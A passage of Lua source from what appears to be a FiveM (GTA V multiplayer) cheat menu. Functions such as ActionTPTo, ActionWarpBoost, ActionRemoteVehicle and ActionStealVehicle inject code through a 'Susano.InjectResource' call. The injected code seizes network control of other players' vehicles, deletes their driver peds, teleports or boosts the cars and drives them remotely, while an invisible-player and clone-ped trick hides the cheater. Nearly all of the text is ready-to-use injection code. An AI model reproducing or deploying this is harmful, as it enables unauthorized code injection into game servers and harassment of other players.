    local targetHeading = GetEntityHeading(targetPed)
    local offsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, 3.0, 0.0, 0.0)
    
    SetEntityCoordsNoOffset(closestVeh, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false)
    SetEntityHeading(closestVeh, targetHeading)
    SetVehicleOnGroundProperly(closestVeh)
    
    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(giveCam, false)
    if not rawget(_G, 'isSpectating') then
        RenderScriptCams(false, false, 0, true, true)
    end
    DestroyCam(giveCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)
end)
        ]], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionGiveRamp()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d
local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

CreateThread(function()
    local playerPed = PlayerPedId()
    local myCoords = GetEntityCoords(playerPed)
    local myHeading = GetEntityHeading(playerPed)
    
    local rampCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(rampCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(rampCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(rampCam, GetGameplayCamFov())
    SetCamActive(rampCam, true)
    RenderScriptCams(true, false, 0, true, true)
    
    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end

    local groundZ = myCoords.z
    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end
    
    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)
    
    SetEntityVisible(playerPed, false, false)
    
    local targetCoords = GetEntityCoords(targetVehicle)
    local vehicles = {}
    local searchRadius = 100.0
    local vehHandle, veh = FindFirstVehicle()
    local success
    
    repeat
        local vehCoords = GetEntityCoords(veh)
        local distance = #(targetCoords - vehCoords)
        local vehClass = GetVehicleClass(veh)
        if distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 then
            table.insert(vehicles, {handle = veh, distance = distance})
        end
        success, veh = FindNextVehicle(vehHandle)
    until not success
    EndFindVehicle(vehHandle)
    
    if #vehicles < 3 then
        SetEntityVisible(playerPed, true, false)
        SetCamActive(rampCam, false)
        RenderScriptCams(false, false, 0, true, true)
        DestroyCam(rampCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
        return
    end
    
    table.sort(vehicles, function(a, b) return a.distance < b.distance end)
    local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}
    
    local function takeControl(veh)
        SetPedIntoVehicle(playerPed, veh, -1)
        Wait(150)
        SetEntityAsMissionEntity(veh, true, true)
        if NetworkGetEntityIsNetworked(veh) then
            NetworkRequestControlOfEntity(veh)
            local timeout = 0
            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                NetworkRequestControlOfEntity(veh)
                Wait(10)
                timeout = timeout + 1
            end
        end
        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
        SetEntityHeading(playerPed, myHeading)
        Wait(100)
    end
    
    for i = 1, 3 do
        if DoesEntityExist(selectedVehicles[i]) then
            takeControl(selectedVehicles[i])
        end
    end
    
    local rampPositions = {
        {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
        {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
        {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
    }
    
    for i = 1, 3 do
        if DoesEntityExist(selectedVehicles[i]) and DoesEntityExist(targetVehicle) then
            local pos = rampPositions[i]
            AttachEntityToEntity(selectedVehicles[i], targetVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
        end
    end
    
    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(rampCam, false)
    RenderScriptCams(false, false, 0, true, true)
    DestroyCam(rampCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)
end)
        ]], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

                    Menu.GiveMode = "Vehicle"

                    function Menu.ActionGive()
                        local giveMode = Menu.GiveMode or "Vehicle"
                        if giveMode == "Vehicle" then
                            Menu.ActionGiveVehicle()
                        elseif giveMode == "Ramp" then
                            Menu.ActionGiveRamp()
                        end
                    end

Menu.TPLocation = "ocean"

function Menu.ActionTPTo()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    local tpLocation = Menu.TPLocation or "ocean"
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d
local tpLocation = "%s"

local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

local locations = {
    ocean = {coords = vector3(-3000.0, -3000.0, 0.0), name = "Ocean"},
    mazebank = {coords = vector3(-75.0, -818.0, 326.0), name = "Maze Bank"},
    sandyshores = {coords = vector3(1960.0, 3740.0, 32.0), name = "Sandy Shores"}
}

local destCoords = locations[tpLocation].coords
local destName = locations[tpLocation].name

local playerPed = PlayerPedId()
local savedCoords = GetEntityCoords(playerPed)
local savedHeading = GetEntityHeading(playerPed)

local function RequestControl(entity, timeoutMs)
    if not entity or not DoesEntityExist(entity) then return false end
    local start = GetGameTimer()
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Wait(0)
        if GetGameTimer() - start > (timeoutMs or 500) then
            return false
        end
        NetworkRequestControlOfEntity(entity)
    end
    return true
end

local function tryEnterSeat(seatIndex)
    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
    Wait(0)
    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
end

local function getFirstFreeSeat(v)
    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
    if not numSeats or numSeats <= 0 then return -1 end
    for seat = 0, (numSeats - 2) do
        if IsVehicleSeatFree(v, seat) then return seat end
    end
    return -1
end

ClearPedTasksImmediately(playerPed)
SetVehicleDoorsLocked(targetVehicle, 1)
SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
    TaskLeaveVehicle(playerPed, targetVehicle, 0)
    Wait(500)
    
    SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)
    
    Wait(100)
    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
    SetEntityHeading(playerPed, savedHeading)
    
    return
end

if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
    TaskLeaveVehicle(playerPed, targetVehicle, 0)
    Wait(500)
    
    SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)
    
    Wait(100)
    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
    SetEntityHeading(playerPed, savedHeading)
    
    return
end

local fallbackSeat = getFirstFreeSeat(targetVehicle)
if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
    local drv = GetPedInVehicleSeat(targetVehicle, -1)
    if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
        RequestControl(drv, 750)
        ClearPedTasksImmediately(drv)
        SetEntityAsMissionEntity(drv, true, true)
        SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
        Wait(50)
        DeleteEntity(drv)
        
        for i=1,80 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
    end
    
    for attempt = 1, 30 do
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Wait(500)
            
            SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)
            
            Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)
            
            return
        end
        Wait(0)
    end
end
        ]], targetServerId, tpLocation)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionWarpVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d

local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

local playerPed = PlayerPedId()

local function RequestControl(entity, timeoutMs)
    if not entity or not DoesEntityExist(entity) then return false end
    local start = GetGameTimer()
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Wait(0)
        if GetGameTimer() - start > (timeoutMs or 500) then
            return false
        end
        NetworkRequestControlOfEntity(entity)
    end
    return true
end

local function tryEnterSeat(seatIndex)
    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
    Wait(0)
    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
end

local function getFirstFreeSeat(v)
    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
    if not numSeats or numSeats <= 0 then return -1 end
    for seat = 0, (numSeats - 2) do
        if IsVehicleSeatFree(v, seat) then return seat end
    end
    return -1
end

ClearPedTasksImmediately(playerPed)
SetVehicleDoorsLocked(targetVehicle, 1)
SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
    return
end

if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
    return
end

local fallbackSeat = getFirstFreeSeat(targetVehicle)
if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
    local drv = GetPedInVehicleSeat(targetVehicle, -1)
    if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
        RequestControl(drv, 750)
        ClearPedTasksImmediately(drv)
        SetEntityAsMissionEntity(drv, true, true)
        SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
        Wait(50)
        DeleteEntity(drv)
        
        for i=1,80 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
    end
    
    for attempt = 1, 30 do
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            return
        end
        Wait(0)
    end
end
        ]], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionWarpBoost()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_player_busy') then return end
    rawset(_G, 'warp_boost_player_busy', true)
    
    local targetServerId = %d
    
    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end
    
    if not targetPlayerId then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end
    
    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end
    
    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end
    
    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end
    
    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)
    
    local warpBoostCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(warpBoostCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(warpBoostCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(warpBoostCam, GetGameplayCamFov())
    SetCamActive(warpBoostCam, true)
    RenderScriptCams(true, false, 0, true, true)
    
    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end
    
    local groundZ = initialCoords.z
    local rayHandle = StartShapeTestRay(initialCoords.x, initialCoords.y, initialCoords.z + 2.0, initialCoords.x, initialCoords.y, initialCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end
    
    local clonePed = CreatePed(4, playerModel, initialCoords.x, initialCoords.y, groundZ, initialHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)
    
    SetEntityVisible(playerPed, false, false)
    SetEntityLocallyInvisible(playerPed)
    
    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end
    
    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    
    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end
    
    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end
    
    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    
    local takeoverSuccess = false
    local tStart = GetGameTimer()
    
    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)
        
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end
        
        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end
        
        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end
        
        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
        
        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end
    
    if takeoverSuccess then
        if DoesEntityExist(targetVehicle) then
            FreezeEntityPosition(targetVehicle, true)
            SetVehicleEngineOn(targetVehicle, true, true, false)
            
            local targetSpeed = 140.0
            for i = 1, 4 do
                SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                Wait(0)
            end
        end
        TaskLeaveVehicle(playerPed, targetVehicle, 0)
        for i = 1, 10 do
            if not IsPedInVehicle(playerPed, targetVehicle, false) then break end
            ClearPedTasksImmediately(playerPed)
            Wait(0)
        end
        
        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
        SetEntityHeading(playerPed, initialHeading)
        Wait(50)
        
        if DoesEntityExist(targetVehicle) then
            FreezeEntityPosition(targetVehicle, false)
            NetworkRequestControlOfEntity(targetVehicle)
            
            CreateThread(function()
                local targetSpeed = 140.0
                for i = 1, 12 do
                    SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                    Wait(0)
                end
            end)
        end
    end
    
    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(warpBoostCam, false)
    if not rawget(_G, 'isSpectating') then
        RenderScriptCams(false, false, 0, true, true)
    end
    DestroyCam(warpBoostCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)
    
    rawset(_G, 'warp_boost_player_busy', false)
end)
        ]], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

                    Menu.WarpMode = "Classic"

                    function Menu.ActionWarp()
                        local warpMode = Menu.WarpMode or "Classic"
                        if warpMode == "Classic" then
                            Menu.ActionWarpVehicle()
                        elseif warpMode == "Boost" then
                            Menu.ActionWarpBoost()
                        end
                    end

-- Teleport Into : warp dans le véhicule de la cible comme passager
function Menu.ActionTeleportInto()
    if not Menu.SelectedPlayer then return end
    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end

            local targetVeh = GetVehiclePedIsIn(targetPed, false)
            if not targetVeh or targetVeh == 0 then
                -- Pas en véhicule : TP directement à côté
                local tc = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(PlayerPedId(), tc.x + 1.0, tc.y, tc.z, false, false, false)
                return
            end

            local playerPed = PlayerPedId()

            -- Chercher un siège libre (-1=driver, 0=passager avant, 1-2=arrière)
            local seatFound = nil
            for seat = 0, GetVehicleMaxNumberOfPassengers(targetVeh) - 1 do
                if IsVehicleSeatFree(targetVeh, seat) then
                    seatFound = seat
                    break
                end
            end

            if not seatFound then
                -- Aucun siège libre : éjecter le passager du siège 0
                local passengerPed = GetPedInVehicleSeat(targetVeh, 0)
                if passengerPed and passengerPed ~= 0 and DoesEntityExist(passengerPed) then
                    TaskLeaveVehicle(passengerPed, targetVeh, 16)
                    Wait(500)
                end
                seatFound = 0
            end

            -- TP au véhicule puis warp dans le siège
            local vc = GetEntityCoords(targetVeh)
            SetEntityCoordsNoOffset(playerPed, vc.x, vc.y, vc.z, false, false, false)
            Wait(100)
            SetPedIntoVehicle(playerPed, targetVeh, seatFound)
        ]], targetServerId))
    end
end

function Menu.ActionRemoteVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([=[
CreateThread(function()
    local targetServerId = %d

    local stopFn = rawget(_G, 'remote_vehicle_stop')
    if stopFn and type(stopFn) == 'function' then
        stopFn()
        return
    end

    rawset(_G, 'remote_vehicle_active', true)

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end
    if not targetPlayerId then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 800) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    RequestControl(targetVehicle, 1200)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    ClearPedTasksImmediately(playerPed)

    local takeoverSuccess = false
    local tStart = GetGameTimer()
    while (GetGameTimer() - tStart) < 1200 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end
        Wait(0)
    end

    if not takeoverSuccess then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    TaskLeaveVehicle(playerPed, targetVehicle, 16)
    local leaveT = GetGameTimer()
    while IsPedInVehicle(playerPed, targetVehicle, false) and (GetGameTimer() - leaveT) < 2000 do
        ClearPedTasksImmediately(playerPed)
        Wait(0)
    end

    SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
    SetEntityHeading(playerPed, initialHeading)

    local cam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    SetCamFov(cam, GetGameplayCamFov())
    SetCamActive(cam, true)
    RenderScriptCams(true, false, 0, true, true)

    local running = true
    rawset(_G, 'remote_vehicle_stop', function()
        running = false
    end)

    local throttle = 0.0
    local steerState = 0.0
    local maxSpeed = 22.0

    local yaw = GetEntityHeading(targetVehicle) %% 360.0
    local pitch = 10.0
    local dist = 8.0
    local height = 2.8
    
    local smoothCamX = 0.0
    local smoothCamY = 0.0
    local smoothCamZ = 0.0

    local function clamp(v, mn, mx)
        if v < mn then return mn end
        if v > mx then return mx end
        return v
    end

    while running do
        Wait(0)

        if not DoesEntityExist(targetVehicle) then
            break
        end

        RequestControl(targetVehicle, 0)
        SetVehicleEngineOn(targetVehicle, true, true, false)

        if IsControlJustPressed(0, 73) then
            break
        end

        DisableControlAction(0, 30, true)
        DisableControlAction(0, 31, true)

        local lookLR = GetControlNormal(0, 1)
        local lookUD = GetControlNormal(0, 2)
        if lookLR ~= 0.0 or lookUD ~= 0.0 then
            yaw = (yaw + (lookLR * 4.5)) %% 360.0
            pitch = clamp(pitch + (lookUD * 3.5), -70.0, 70.0)
        end

        local vehCoords = GetEntityCoords(targetVehicle)
        local yawRad = math.rad(yaw)
        local pitchRad = math.rad(pitch)
        local dirX = math.sin(yawRad)
        local dirY = math.cos(yawRad)
        local cosP = math.cos(pitchRad)
        local sinP = math.sin(pitchRad)

        local targetCamX = vehCoords.x - (dirX * dist * cosP)
        local targetCamY = vehCoords.y - (dirY * dist * cosP)
        local targetCamZ = vehCoords.z + height + (dist * sinP)

        smoothCamX = smoothCamX + (targetCamX - smoothCamX) * 0.15
        smoothCamY = smoothCamY + (targetCamY - smoothCamY) * 0.15
        smoothCamZ = smoothCamZ + (targetCamZ - smoothCamZ) * 0.15

        SetCamCoord(cam, smoothCamX, smoothCamY, smoothCamZ)
        PointCamAtEntity(cam, targetVehicle, 0.0, 0.0, 0.0, true)

        local throttleIn = 0.0
        if IsControlPressed(0, 32) then throttleIn = 1.0 end
        if IsControlPressed(0, 33) then throttleIn = -1.0 end
        throttle = throttle + (throttleIn - throttle) * 0.12

        local trim = 0.0
        if IsControlPressed(0, 34) then trim = trim + 1.0 end
        if IsControlPressed(0, 35) then trim = trim - 1.0 end

        local desiredHeading = yaw
        local vehHeading = GetEntityHeading(targetVehicle)
        local diff = desiredHeading - vehHeading
        while diff > 180.0 do diff = diff - 360.0 end
        while diff < -180.0 do diff = diff + 360.0 end

        local steerIn = (diff / 55.0) + (trim * 0.35)
        if steerIn > 1.0 then steerIn = 1.0 end
        if steerIn < -1.0 then steerIn = -1.0 end
        steerState = steerState + (steerIn - steerState) * 0.16

        SetVehicleSteeringAngle(targetVehicle, steerState * 25.0)

        local speed = GetEntitySpeed(targetVehicle)
        local vel = GetEntityVelocity(targetVehicle)

        local forceMul = 6.0
        local brakeMul = 9.0
        local dragMul = 0.18

        if speed > maxSpeed then
            ApplyForceToEntity(targetVehicle, 1, -vel.x * 0.45, -vel.y * 0.45, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end

        if throttle > 0.05 then
            if speed < maxSpeed then
                ApplyForceToEntity(targetVehicle, 1, dirX * (forceMul * throttle), dirY * (forceMul * throttle), 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
            end
        elseif throttle < -0.05 then
            ApplyForceToEntity(targetVehicle, 1, -dirX * (brakeMul * -throttle), -dirY * (brakeMul * -throttle), 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end

        ApplyForceToEntity(targetVehicle, 1, -vel.x * dragMul, -vel.y * dragMul, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
    end

    rawset(_G, 'remote_vehicle_stop', nil)
    rawset(_G, 'remote_vehicle_active', false)

    SetCamActive(cam, false)
    RenderScriptCams(false, false, 0, true, true)
    DestroyCam(cam, true)
end)
]=], targetServerId)
        
        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionStealVehicle()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_busy') then return end
    rawset(_G, 'warp_boost_busy', true)
    
    local targetServerId = %d
    
    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end
    
    if not targetPlayerId then
